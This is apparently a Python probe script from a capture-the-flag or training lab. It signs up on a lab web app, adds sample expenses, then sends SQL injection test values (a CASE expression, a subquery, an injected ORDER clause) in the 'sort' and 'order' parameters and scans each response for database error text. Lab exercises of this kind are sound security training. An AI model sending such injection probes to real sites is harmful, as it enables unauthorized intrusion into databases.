import sys, re, time, requests, urllib3
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://chatelaine.cylabacademy.net:27165/"
s = requests.Session()
s.post(BASE + "signup", data={"username": "u752h", "email": "u752h@x.io", "password": "p752h"}, timeout=20)
time.sleep(0.4)
s.post(BASE + "login", data={"username": "u752h", "password": "p752h"}, timeout=20)
time.sleep(0.4)
for i in range(3):
    s.post(BASE + "expenses", data={"description": "e%d" % i, "amount": str(5 + i), "date": "2024-02-0%d" % (i + 1)}, timeout=25)
    time.sleep(0.8)

tests = [
    ("sort=description", "sort valide"),
    ("sort=xxx", "sort invalide"),
    ("order=desc", "order desc"),
    ("sort=description&order=desc", "sort+order"),
    ("sort=1", "sort numerique"),
    ("sort=case when 1=1 then description else amount end", "CASE"),
    ("sort=(select 1)", "sous-requete"),
    ("order=description desc", "order+colonne"),
]
base_html = None
for q, label in tests:
    try:
        r = s.get(BASE + "expenses?" + q, timeout=20)
        err = re.search(r"(error|Error|SQL|sqlite|Traceback|syntax)", r.text)
        print("%-42s -> %d (%d o) %s" % (label, r.status_code, len(r.text), ("ERR:" + err.group(0)) if err else ""))
        if base_html is None:
            base_html = r.text
    except Exception as e:
        print("%-42s -> ERR %s" % (label, type(e).__name__))
    time.sleep(0.4)
